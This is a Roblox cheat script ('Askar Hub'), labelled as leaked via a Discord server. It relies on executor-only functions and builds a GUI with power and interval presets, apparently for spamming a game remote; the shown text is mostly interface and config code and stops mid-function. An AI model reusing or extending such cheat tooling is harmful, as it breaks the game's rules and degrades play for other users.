 -- by  M10RU and uzaki and Al SHAB7
-- leaked by this server (https://discord.gg/9adWmQnp8) 
-- leaked by this server (https://discord.gg/9adWmQnp8)
-- leaked by this server (https://discord.gg/9adWmQnp8)
-- leaked by this server (https://discord.gg/9adWmQnp8)
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")

local CONFIG_FILE = "askarhub_ping.json"
local DEFAULT_CFG = {
    power        = 100000,
    power1       = 100000,
    power2       = 75000,
    interval1     = 0.13,
    interval2     = 0.125,
    activePower  = 1,
    interval     = 0.13,
    keybindKb    = "F",
    keybindGp    = "ButtonR2",
    autoBrainrot = true,
}
local savedUi = {}
local bgIndex = 1 -- fixed background
local colorIndex = 1
local customStroke = nil
local captureUiState

local cfg = {
    power        = DEFAULT_CFG.power,
    power1       = DEFAULT_CFG.power1,
    power2       = DEFAULT_CFG.power2,
    interval1     = DEFAULT_CFG.interval1,
    interval2     = DEFAULT_CFG.interval2,
    activePower  = DEFAULT_CFG.activePower,
    interval     = DEFAULT_CFG.interval,
    keybindKb    = DEFAULT_CFG.keybindKb,
    keybindGp    = DEFAULT_CFG.keybindGp,
    autoBrainrot = DEFAULT_CFG.autoBrainrot,
    selectedPreset = nil,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end


local function saveConfig()
    if captureUiState then pcall(captureUiState) end
    cfg.power = tonumber(cfg.power1) or cfg.power or 100000
    cfg.interval = tonumber(cfg.interval1) or cfg.interval or 0.13
    local data = {
        power = cfg.power,
        power1 = cfg.power1,
        power2 = cfg.power2,
        interval1 = cfg.interval1,
        interval2 = cfg.interval2,
        activePower = 1,
        interval = cfg.interval,
        keybindKb = cfg.keybindKb,
        keybindGp = cfg.keybindGp,
        autoBrainrot = cfg.autoBrainrot,
        selectedPreset = cfg.selectedPreset,
        ui = savedUi,
    }
    local ok, encoded = pcall(function()
        return HttpService:JSONEncode(data)
    end)
    if not ok or not encoded then
        warn("[Askar Hub] save encode failed")
        return
    end
    -- try multiple FS APIs used by different executors
    local saved = false
    pcall(function()
        if writefile then
            writefile(CONFIG_FILE, encoded)
            saved = true
        end
    end)
    pcall(function()
        if not saved and writefile then
            writefile("AskarHub/" .. CONFIG_FILE, encoded)
            saved = true
        end
    end)
    pcall(function()
        if makefolder then pcall(makefolder, "AskarHub") end
        if writefile then
            writefile("AskarHub/" .. CONFIG_FILE, encoded)
            saved = true
        end
    end)
    -- session backup
    pcall(function()
        if getgenv then
            getgenv().AskarHubPingConfig = data
        end
    end)
    if saved then
        print("[Askar Hub] Config saved | power=" .. tostring(cfg.power) .. " interval=" .. tostring(cfg.interval) .. " preset=" .. tostring(cfg.selectedPreset))
    else
        warn("[Askar Hub] writefile not available — session backup only")
    end
end

local function loadConfig()
    local data = nil
    -- 1) file
    pcall(function()
        if isfile and readfile then
            if isfile(CONFIG_FILE) then
                data = HttpService:JSONDecode(readfile(CONFIG_FILE))
            elseif isfile("AskarHub/" .. CONFIG_FILE) then
                data = HttpService:JSONDecode(readfile("AskarHub/" .. CONFIG_FILE))
            end
        end
    end)
    -- 2) session
    if type(data) ~= "table" then
        pcall(function()
            if getgenv and type(getgenv().AskarHubPingConfig) == "table" then
                data = getgenv().AskarHubPingConfig
            end
        end)
    end
    if type(data) ~= "table" then return end
    savedUi = type(data.ui) == "table" and data.ui or {}
    cfg.power1 = tonumber(data.power1) or tonumber(data.power) or DEFAULT_CFG.power1
    cfg.power2 = tonumber(data.power2) or DEFAULT_CFG.power2
    cfg.interval1 = tonumber(data.interval1) or tonumber(data.interval) or DEFAULT_CFG.interval1
    cfg.interval2 = tonumber(data.interval2) or DEFAULT_CFG.interval2
    cfg.activePower = 1
    cfg.power = cfg.power1
    cfg.interval = cfg.interval1
    cfg.keybindKb = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    if type(data.autoBrainrot) == "boolean" then cfg.autoBrainrot = data.autoBrainrot end
    cfg.selectedPreset = type(data.selectedPreset) == "string" and data.selectedPreset or nil
    print("[Askar Hub] Config loaded | power=" .. tostring(cfg.power) .. " interval=" .. tostring(cfg.interval) .. " preset=" .. tostring(cfg.selectedPreset))
end

loadConfig()


local active = false
local activePowerButton, backupPowerButton, profileLabel
local primaryLed, backupLed
local refreshPowerRows
local powerBox, delayBox1, backupPowerBox, delayBox2
local listeningFor = nil
local remote = nil
local brainrotMode = false
local lastBrainrotState = false
local manualOverride = false
local pingLoopRunning = false
local applyAccentColors

local PHOTO1_ACCENT = Color3.fromRGB(83, 111, 78)
local PHOTO2_ACCENT = Color3.fromRGB(255, 150, 40)
local BG_LIST = {
    { name = "ASKAR", id = "rbxassetid://106558261630132", accent = Color3.fromRGB(255, 200, 40), text = Color3.fromRGB(255,255,255), stroke = Color3.fromRGB(255, 210, 60) },
}

local COLOR_OPTIONS = {
    Color3.fromRGB(255, 35, 35), Color3.fromRGB(255, 80, 35), Color3.fromRGB(255, 145, 25),
    Color3.fromRGB(255, 220, 35), Color3.fromRGB(150, 235, 35), Color3.fromRGB(40, 220, 90),
    Color3.fromRGB(0, 190, 130), Color3.fromRGB(30, 210, 235), Color3.fromRGB(40, 150, 255),
    Color3.fromRGB(80, 100, 255), Color3.fromRGB(135, 75, 255), Color3.fromRGB(195, 70, 255),
    Color3.fromRGB(255, 60, 185), Color3.fromRGB(255, 90, 130), Color3.fromRGB(255, 255, 255),
    Color3.fromRGB(120, 130, 140),
}
local function getEntry()
    local i = tonumber(bgIndex) or 1
    if i < 1 then i = 1 end
    if i > #BG_LIST then i = #BG_LIST end
    return BG_LIST[i]
end
local function getBgId()    return "rbxassetid://106558261630132" end
local function getBgName()  return getEntry().name end
local function getAccent()  return getEntry().accent end
local function getText()    return getEntry().text end
local function getStroke()  return customStroke or getEntry().stroke end

for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "AskarHubGui" or kid.Name == "AskarHubIntro" then
        kid:Destroy()
    end
end

local function tw(obj, props, t)
    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function makeDraggable(frame, lockFlag)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if lockFlag and lockFlag() then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = i.Position
            startPos = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    if captureUiState then captureUiState(); saveConfig() end
                end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if lockFlag and lockFlag() then dragging = false; return end
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepadKeyCode(kc)
    if not kc then return false end
    local name = kc.Name
    return name:find("Button") == 1 or name == "DPadUp" or name == "DPadDown" or name == "DPadLeft" or
        name == "DPadRight" or name == "ButtonSelect" or name == "ButtonStart" or name == "Thumbstick1" or name == "Thumbstick2"
end

local BLACKLISTED = {[Enum.KeyCode.Escape] = true, [Enum.KeyCode.LeftControl] = true, [Enum.KeyCode.Unknown] = true}

local WHITE = Color3.fromRGB(255,255,255)
local GREEN = Color3.fromRGB(0,220,110)
local RED = Color3.fromRGB(255,110,130)
local BRIGHT_RED = Color3.fromRGB(255, 0, 0)
local TOGGLE_OFF = Color3.fromRGB(70,25,35)
local TOGGLE_KNOB = Color3.fromRGB(240,240,240)

local screen = Instance.new("ScreenGui")
screen.Name = "AskarHubGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 18
screen.IgnoreGuiInset = true
local okParent = false
if gethui then okParent = pcall(function() screen.Parent = gethui() end) end
if not okParent then
    pcall(function() screen.Parent = plrGui end)
end

local uiLocked = false
local pingMinimized = false

local SCALE = 0.62
local MAIN_W = math.floor(420 * SCALE)
local MAIN_H = math.floor(150 * SCALE)
local MIN_HEIGHT = 28

local accent0 = getAccent()
local text0 = getText()
local stroke0 = getStroke()
local accentDim0 = accent0:Lerp(Color3.new(0,0,0), 0.4)
local rowBg0 = Color3.new(accent0.R*0.2, accent0.G*0.2, accent0.B*0.2)
local rowBoxBg0 = Color3.new(accent0.R*0.15, accent0.G*0.15, accent0.B*0.15)
local tabAct0 = Color3.new(accent0.R*0.3, accent0.G*0.3, accent0.B*0.3)
local tabInact0 = Color3.new(accent0.R*0.1, accent0.G*0.1, accent0.B*0.1)

local mainFrame = Instance.new("Frame")
mainFrame.Name = "AskarHubMain"
mainFrame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
mainFrame.Position = UDim2.new(0.5, -MAIN_W/2, 0.22, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
mainFrame.BackgroundTransparency = 1
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.ClipsDescendants = true
mainFrame.Parent = screen
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color = stroke0
mainStroke.Thickness = 1.5
mainStroke.Transparency = 0.2
makeDraggable(mainFrame, function() return uiLocked end)

local mainBgImage = Instance.new("ImageLabel", mainFrame)
mainBgImage.Name = "MainBgImage"
mainBgImage.Size = UDim2.new(1,0,1,0)
mainBgImage.BackgroundTransparency = 1
mainBgImage.Image = getBgId()
mainBgImage.ScaleType = Enum.ScaleType.Crop
mainBgImage.ZIndex = 1
Instance.new("UICorner", mainBgImage).CornerRadius = UDim.new(0, 12)

local darkOverlay = Instance.new("Frame", mainFrame)
darkOverlay.Size = UDim2.new(1,0,1,0)
darkOverlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
darkOverlay.BackgroundTransparency = 0.72
darkOverlay.BorderSizePixel = 0
darkOverlay.ZIndex = 2
Instance.new("UICorner", darkOverlay).CornerRadius = UDim.new(0, 12)

local header = Instance.new("Frame", mainFrame)
header.Size = UDim2.new(1,0,0,28)
header.BackgroundTransparency = 1
header.BorderSizePixel = 0
header.ZIndex = 3

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size = UDim2.new(0, 195, 1, 0)
titleLbl.Position = UDim2.new(0, 8, 0, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "ASKAR HUB"
titleLbl.TextColor3 = stroke0
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 13
titleLbl.TextXAlignment = Enum.TextXAlignment.Left
titleLbl.TextStrokeTransparency = 0.3
titleLbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
titleLbl.ZIndex = 4

local btnContainer = Instance.new("Frame", header)
btnContainer.Size = UDim2.new(0, 62, 0, 20)
btnContainer.Position = UDim2.new(1, -68, 0.5, -10)
btnContainer.BackgroundTransparency = 1
btnContainer.ZIndex = 4
local btnLayout = Instance.new("UIListLayout", btnContainer)
btnLayout.FillDirection = Enum.FillDirection.Horizontal
btnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
btnLayout.VerticalAlignment = Enum.VerticalAlignment.Center
btnLayout.Padding = UDim.new(0, 3)
btnLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function addStroke(obj, thickness, transparency)
    local s = Instance.new("UIStroke", obj)
    s.Color = stroke0
    s.Thickness = thickness or 1
    s.Transparency = transparency or 0.3
    return s
end

local function mkHeaderBtn(text, order, size, textSize)
    local btn = Instance.new("TextButton", btnContainer)
    btn.Size = UDim2.new(0, size or 18, 0, size or 18)
    btn.BackgroundColor3 = rowBg0
    btn.BorderSizePixel = 0
    btn.Text = text
    btn.TextColor3 = text0
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = textSize or 9
    btn.ZIndex = 5
    btn.AutoButtonColor = false
    btn.LayoutOrder = order
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
    addStroke(btn)
    return btn
end

local lockBtn = mkHeaderBtn("🔓", 1, 18, 9)
local minimizeBtn = mkHeaderBtn("—", 2, 18, 11)
local gearBtn = mkHeaderBtn("⚙", 3, 18, 10)

local statusPill = Instance.new("Frame", header)
statusPill.Name = "statusPill"
statusPill.Size = UDim2.new(0, 48, 0, 16)
statusPill.Position = UDim2.new(1, -122, 0.5, -8)
statusPill.BackgroundColor3 = Color3.fromRGB(50,20,40)
statusPill.BorderSizePixel = 0
statusPill.ZIndex = 4
Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
local statusLbl = Instance.new("TextLabel", statusPill)
statusLbl.Name = "statusLbl"
statusLbl.Size = UDim2.new(1,0,1,0)
statusLbl.BackgroundTransparency = 1
statusLbl.Text = "OFF"
statusLbl.TextColor3 = RED
statusLbl.Font = Enum.Font.GothamBlack
statusLbl.TextSize = 8
statusLbl.ZIndex = 5

local mainContent = Instance.new("Frame", mainFrame)
mainContent.Name = "MainContent"
mainContent.Size = UDim2.new(1,0,1,-28)
mainContent.Position = UDim2.new(0,0,0,28)
mainContent.BackgroundTransparency = 1
mainContent.BorderSizePixel = 0
mainContent.ZIndex = 3

local activateBtn = Instance.new("TextButton", mainContent)
activateBtn.Name = "activateBtn"
activateBtn.Size = UDim2.new(1,-10,0,27)
activateBtn.Position = UDim2.new(0,5,0,5)
activateBtn.BackgroundColor3 = rowBg0
activateBtn.BackgroundTransparency = 0.15
activateBtn.BorderSizePixel = 0
activateBtn.Text = ""
activateBtn.AutoButtonColor = false
activateBtn.ZIndex = 4
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0, 7)
local ag = Instance.new("UIGradient", activateBtn)
ag.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, accentDim0),
    ColorSequenceKeypoint.new(1, accent0)
})
ag.Rotation = 120
ag.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.4),
    NumberSequenceKeypoint.new(1, 0.4)
})
local aStroke = Instance.new("UIStroke", activateBtn)
aStroke.Color = stroke0
aStroke.Thickness = 1.2
aStroke.Transparency = 0.4
local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size = UDim2.new(1,0,1,0)
activateLbl.BackgroundTransparency = 1
activateLbl.Text = "ACTIVATE"
activateLbl.TextColor3 = text0
activateLbl.Font = Enum.Font.GothamBlack
activateLbl.TextSize = 10
activateLbl.ZIndex = 5

-- ===== Main presets (outside settings) LOW / MED / HIGH =====
local mainPresetRow = Instance.new("Frame", mainContent)
mainPresetRow.Name = "MainPresetRow"
mainPresetRow.Size = UDim2.new(1, -10, 0, 26)
mainPresetRow.Position = UDim2.new(0, 5, 0, 36)
mainPresetRow.BackgroundTransparency = 1
mainPresetRow.ZIndex = 4

local function mkMainPreset(text, xScale)
    local b = Instance.new("TextButton", mainPresetRow)
    b.Size = UDim2.new(0.32, -2, 1, 0)
    b.Position = UDim2.new(xScale, 0, 0, 0)
    b.BackgroundColor3 = rowBg0
    b.BackgroundTransparency = 0.15
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = text0
    b.Font = Enum.Font.GothamBlack
    b.TextSize = 10
    b.AutoButtonColor = false
    b.ZIndex = 5
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
    local st = Instance.new("UIStroke", b)
    st.Color = stroke0
    st.Thickness = 1.1
    st.Transparency = 0.4
    return b
end

local mainLowBtn  = mkMainPreset("LOW", 0)
local mainMedBtn  = mkMainPreset("MED", 0.34)
local mainHighBtn = mkMainPreset("HIGH", 0.68)

local function applyMainPreset(powerVal, intervalVal, presetName)
    powerVal = math.floor(tonumber(powerVal) or 65000)
    intervalVal = tonumber(intervalVal) or 0.125
    if intervalVal < 0.001 then intervalVal = 0.001 end

    cfg.activePower = 1
    cfg.power1 = powerVal
    cfg.interval1 = intervalVal
    cfg.power2 = powerVal
    cfg.interval2 = intervalVal
    cfg.power = powerVal
    cfg.interval = intervalVal
    if presetName then cfg.selectedPreset = presetName end

    if powerBox then powerBox.Text = tostring(powerVal) end
    if delayBox1 then delayBox1.Text = tostring(intervalVal) end

    if refreshPowerProfile then pcall(refreshPowerProfile) end
    if refreshPowerRows then pcall(refreshPowerRows) end
    pcall(saveConfig)
end


local selectedPreset = nil
local presetTweenInfo = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local function setPresetVisual(btn)
    local accent = (getAccent and getAccent()) or Color3.fromRGB(255, 200, 40)
    local strokeCol = (getStroke and getStroke()) or accent
    for _, b in ipairs({mainLowBtn, mainMedBtn, mainHighBtn}) do
        local st = b:FindFirstChildOfClass("UIStroke")
        if b == btn then
            -- selected: bright fill + strong stroke + slight scale feel via transparency
            TweenService:Create(b, presetTweenInfo, {
                BackgroundColor3 = accent,
                BackgroundTransparency = 0.05,
                TextColor3 = Color3.fromRGB(0, 0, 0)
            }):Play()
            if st then
                TweenService:Create(st, presetTweenInfo, {
                    Color = Color3.fromRGB(255, 255, 255),
                    Thickness = 2,
                    Transparency = 0
                }):Play()
            end
        else
            -- unselected
            local dim = Color3.new(accent.R * 0.2, accent.G * 0.2, accent.B * 0.2)
            TweenService:Create(b, presetTweenInfo, {
                BackgroundColor3 = dim,
                BackgroundTransparency = 0.2,
                TextColor3 = Color3.fromRGB(255, 255, 255)
            }):Play()
            if st then
                TweenService:Create(st, presetTweenInfo, {
                    Color = strokeCol,
                    Thickness = 1.1,
                    Transparency = 0.45
                }):Play()
            end
        end
    end
    selectedPreset = btn
end

mainLowBtn.MouseButton1Click:Connect(function()
    applyMainPreset(65000, 0.125, "LOW")
    setPresetVisual(mainLowBtn)
end)
mainMedBtn.MouseButton1Click:Connect(function()
    applyMainPreset(85000, 0.125, "MED")
    setPresetVisual(mainMedBtn)
end)
mainHighBtn.MouseButton1Click:Connect(function()
    applyMainPreset(100000, 0.13, "HIGH")
    setPresetVisual(mainHighBtn)
end)


local function updateToggleButton()
    if refreshPowerRows then refreshPowerRows() end
    if active then
        activateLbl.Text = "ACTIVATED"
        aStroke.Transparency = 0.1
        ag.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, GREEN),
            ColorSequenceKeypoint.new(1, GREEN:Lerp(Color3.new(0,0,0), 0.3))
        })
        statusLbl.Text = "ON"
        statusLbl.TextColor3 = GREEN
        statusPill.BackgroundColor3 = Color3.fromRGB(20,50,35)
    else
        activateLbl.Text = "ACTIVATE"
        aStroke.Transparency = 0.4
        local acc = getAccent()
        local accDim = acc:Lerp(Color3.new(0,0,0), 0.4)
        ag.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, accDim),
            ColorSequenceKeypoint.new(1, acc)
        })
        statusLbl.Text = "OFF"
        statusLbl.TextColor3 = RED
        statusPill.BackgroundColor3 = Color3.fromRGB(50,20,40)
    end
end

local SET_W, SET_H = 230, 340
local settingsFrame = Instance.new("Frame")
settingsFrame.Name = "AskarHubSettings"
settingsFrame.Size = UDim2.new(0, SET_W, 0, SET_H)
settingsFrame.Position = UDim2.new(0.5, -SET_W/2, 0.22, MAIN_H + 12)
settingsFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
settingsFrame.BackgroundTransparency = 1
settingsFrame.BorderSizePixel = 0
settingsFrame.Active = true
settingsFrame.ClipsDescendants = true
settingsFrame.Visible = false
settingsFrame.ZIndex = 20
settingsFrame.Parent = screen
Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 10)
local ss = Instance.new("UIStroke", settingsFrame)
ss.Color = stroke0
ss.Thickness = 1.3
ss.Transparency = 0.2
makeDraggable(settingsFrame)

captureUiState = function()
    local function posOf(obj)
        return {xs=obj.Position.X.Scale, xo=obj.Position.X.Offset, ys=obj.Position.Y.Scale, yo=obj.Position.Y.Offset}
    end
    savedUi.bgIndex = bgIndex
    savedUi.colorIndex = colorIndex
    if customStroke then savedUi.customStroke = {customStroke.R, customStroke.G, customStroke.B} else savedUi.customStroke = nil end
    savedUi.mainPos = posOf(mainFrame)
    savedUi.settingsPos = posOf(settingsFrame)
end

local function restorePos(obj, value)
    if type(value) == "table" then
        obj.Position = UDim2.new(tonumber(value.xs) or obj.Position.X.Scale, tonumber(value.xo) or obj.Position.X.Offset, tonumber(value.ys) or obj.Position.Y.Scale, tonumber(value.yo) or obj.Position.Y.Offset)
    end
end
restorePos(mainFrame, savedUi.mainPos)
restorePos(settingsFrame, savedUi.settingsPos)

local settingsBgImage = Instance.new("ImageLabel", settingsFrame)
settingsBgImage.Name = "SettingsBgImage"
settingsBgImage.Size = UDim2.new(1,0,1,0)
settingsBgImage.BackgroundTransparency = 1
settingsBgImage.Image = getBgId()
settingsBgImage.ScaleType = Enum.ScaleType.Crop
settingsBgImage.ZIndex = 1
Instance.new("UICorner", settingsBgImage).CornerRadius = UDim.new(0, 10)

local settingsOverlay = Instance.new("Frame", settingsFrame)
settingsOverlay.Size = UDim2.new(1,0,1,0)
settingsOverlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
settingsOverlay.BackgroundTransparency = 0.72
settingsOverlay.BorderSizePixel = 0
settingsOverlay.ZIndex = 2
Instance.new("UICorner", settingsOverlay).CornerRadius = UDim.new(0, 10)

local setHeader = Instance.new("Frame", settingsFrame)
setHeader.Size = UDim2.new(1,0,0,22)
setHeader.BackgroundTransparency = 1
setHeader.BorderSizePixel = 0
setHeader.ZIndex = 21
local setTitle = Instance.new("TextLabel", setHeader)
setTitle.Size = UDim2.new(1,-30,1,0)
setTitle.Position = UDim2.new(0,8,0,0)
setTitle.BackgroundTransparency = 1
setTitle.Text = "ASKAR HUB"
setTitle.TextColor3 = stroke0
setTitle.Font = Enum.Font.GothamBlack
setTitle.TextSize = 8
setTitle.TextXAlignment = Enum.TextXAlignment.Left
setTitle.TextStrokeTransparency = 0.35
setTitle.TextStrokeColor3 = Color3.fromRGB(0,0,0)
setTitle.ZIndex = 22
local setCloseBtn = Instance.new("TextButton", setHeader)
setCloseBtn.Name = "setCloseBtn"
setCloseBtn.Size = UDim2.new(0,16,0,16)
setCloseBtn.Position = UDim2.new(1,-20,0.5,-8)
setCloseBtn.BackgroundColor3 = rowBg0
setCloseBtn.Text = "X"
setCloseBtn.TextColor3 = text0
setCloseBtn.Font = Enum.Font.GothamBlack
setCloseBtn.TextSize = 9
setCloseBtn.ZIndex = 23
setCloseBtn.BorderSizePixel = 0
Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(0, 4)
addStroke(setCloseBtn)
setCloseBtn.MouseButton1Click:Connect(function()
    settingsFrame.Visible = false
end)

local tabBar = Instance.new("Frame", settingsFrame)
tabBar.Size = UDim2.new(1,-12,0,20)
tabBar.Position = UDim2.new(0,6,0,24)
tabBar.BackgroundTransparency = 1
tabBar.ZIndex = 21
local tabLayout = Instance.new("UIListLayout", tabBar)
tabLayout.FillDirection = Enum.FillDirection.Horizontal
tabLayout.Padding = UDim.new(0, 4)
tabLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function mkTab(text, order)
    local btn = Instance.new("TextButton", tabBar)
    btn.Size = UDim2.new(0, 68, 0, 20)
    btn.BackgroundColor3 = tabInact0
    btn.BorderSizePixel = 0
    btn.Text = text
    btn.TextColor3 = text0
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 9
    btn.AutoButtonColor = false
    btn.LayoutOrder = order
    btn.ZIndex = 22
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
    addStroke(btn)
    return btn
end

local tabPower = mkTab("POWER", 1)
tabPower.Visible = false
local tabSettings = mkTab("SETTINGS", 2)
tabSettings.Visible = false

local pagesFrame = Instance.new("Frame", settingsFrame)
pagesFrame.Size = UDim2.new(1,-12,1,-40)
pagesFrame.Position = UDim2.new(0,6,0,28)
pagesFrame.BackgroundTransparency = 1
pagesFrame.ZIndex = 21

local powerPage = Instance.new("Frame", pagesFrame)
powerPage.Size = UDim2.new(1,0,1,0)
powerPage.BackgroundTransparency = 1
powerPage.ZIndex = 21
powerPage.Visible = true

local settingsPage = Instance.new("Frame", pagesFrame)
settingsPage.Size = UDim2.new(1,0,1,0)
settingsPage.BackgroundTransparency = 1
settingsPage.ZIndex = 21
settingsPage.Visible = false

local configPage = Instance.new("Frame") -- removed tab (dummy)
configPage.Visible = false


local function selectTab(which)
    powerPage.Visible = true
    settingsPage.Visible = true
    if tabPower then tabPower.Visible = false end
    if tabSettings then tabSettings.Visible = false end
    if tabBar then tabBar.Visible = false end
end

-- MERGED: single page (no tabs)
pcall(function()
    if tabBar then tabBar.Visible = false end
    if tabPower then tabPower.Visible = false end
    if tabSettings then tabSettings.Visible = false end
    powerPage.Visible = true
    settingsPage.Visible = true
    -- stack settings under power content
    settingsPage.Position = UDim2.new(0, 0, 0, 90)
    powerPage.Position = UDim2.new(0, 0, 0, 0)
    -- enlarge settings window for merged content
end)

local function mkRow(parent, y, label, valueText)
    local row = Instance.new("Frame", parent)
    row.Size = UDim2.new(1,0,0,25)
    row.Position = UDim2.new(0,0,0,y)
    row.BackgroundColor3 = rowBg0
    row.BackgroundTransparency = 0.3
    row.BorderSizePixel = 0
    row.ZIndex = 22
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.5,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = text0
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 9
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 23
    local box = Instance.new("TextBox", row)
    box.Size = UDim2.new(0,84,0,18)
    box.Position = UDim2.new(1,-92,0.5,-9)
    box.BackgroundColor3 = rowBoxBg0
    box.BackgroundTransparency = 0.25
    box.BorderSizePixel = 0
    box.Text = valueText
    box.TextColor3 = stroke0
    box.Font = Enum.Font.GothamBold
    box.TextSize = 9
    box.ClearTextOnFocus = false
    box.ZIndex = 24
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
    addStroke(box, 1, 0.3)
    return box
end

powerBox = mkRow(powerPage, 2, "POWER", tostring(cfg.power1))
delayBox1 = mkRow(powerPage, 31, "INTERVAL", tostring(cfg.interval1))
backupPowerBox = nil -- removed BACKUP
delayBox2 = nil -- removed BACKUP
refreshPowerRows = function()
    if not powerBox or not delayBox1 then return end
    local p1On = active
    local onColor = Color3.fromRGB(0, 190, 75)
    local offColor = rowBg0
    local p1Row, s1Row = powerBox.Parent, delayBox1.Parent
    if p1Row then p1Row.BackgroundColor3 = p1On and onColor or offColor end
    if s1Row then s1Row.BackgroundColor3 = p1On and onColor or offColor end
    powerBox.TextColor3 = p1On and Color3.fromRGB(0,0,0) or getStroke()
    delayBox1.TextColor3 = p1On and Color3.fromRGB(0,0,0) or getStroke()
end
local function refreshPowerProfile()
    cfg.activePower = 1
    cfg.power = cfg.power1
    cfg.interval = cfg.interval1
    if powerBox then powerBox.Text = tostring(cfg.power1) end
    if delayBox1 then delayBox1.Text = tostring(cfg.interval1) end
    if refreshPowerRows then refreshPowerRows() end
end
powerBox.FocusLost:Connect(function()
    local n = tonumber(powerBox.Text)
    cfg.power1 = n and math.max(1, n) or DEFAULT_CFG.power1
    cfg.power = cfg.power1
    cfg.selectedPreset = nil
    if refreshPowerProfile then refreshPowerProfile() end
    saveConfig()
end)
delayBox1.FocusLost:Connect(function()
    local n = tonumber(delayBox1.Text)
    cfg.interval1 = n and math.max(0.001, n) or DEFAULT_CFG.interval1
    cfg.interval = cfg.interval1
    cfg.selectedPreset = nil
    if refreshPowerProfile then refreshPowerProfile() end
    saveConfig()
end)
local profileRow = Instance.new("Frame", powerPage)
profileRow.Name = "PowerProfileRow"
profileRow.Visible = false -- BACKUP removed
profileRow.Size = UDim2.new(1,0,0,25)
profileRow.Position = UDim2.new(0,0,0,60)
profileRow.BackgroundColor3 = rowBg0
profileRow.BackgroundTransparency = 0.3
profileRow.BorderSizePixel = 0
profileRow.ZIndex = 22
Instance.new("UICorner", profileRow).CornerRadius = UDim.new(0,5)
profileLabel = Instance.new("TextLabel", profileRow)
profileLabel.Size = UDim2.new(0,82,1,0)
profileLabel.Position = UDim2.new(0,8,0,0)
profileLabel.BackgroundTransparency = 1
profileLabel.Text = "USE"
profileLabel.TextColor3 = text0
profileLabel.Font = Enum.Font.GothamBold
profileLabel.TextSize = 9
profileLabel.TextXAlignment = Enum.TextXAlignment.Left
profileLabel.ZIndex = 23
local function profileButton(text, x)
    local b = Instance.new("TextButton", profileRow)
    b.Size = UDim2.new(0,56,0,18)
    b.Position = UDim2.new(0,x,0.5,-9)
    b.BackgroundColor3 = rowBoxBg0
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = stroke0
    b.Font = Enum.Font.GothamBold
    b.TextSize = 8
    b.AutoButtonColor = false
    b.ZIndex = 24
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
    addStroke(b,1,0.3)
    return b
end
activePowerButton = profileButton("PRIMARY", 82)
backupPowerButton = profileButton("BACKUP", 142)

local function makePowerLed(button)
    local led = Instance.new("Frame", button)
    led.Name = "ActiveLed"
    led.Size = UDim2.new(0,6,0,6)
    led.Position = UDim2.new(0,3,0.5,-3)
    led.BackgroundColor3 = Color3.fromRGB(70,70,70)
    led.BorderSizePixel = 0
    led.ZIndex = 26
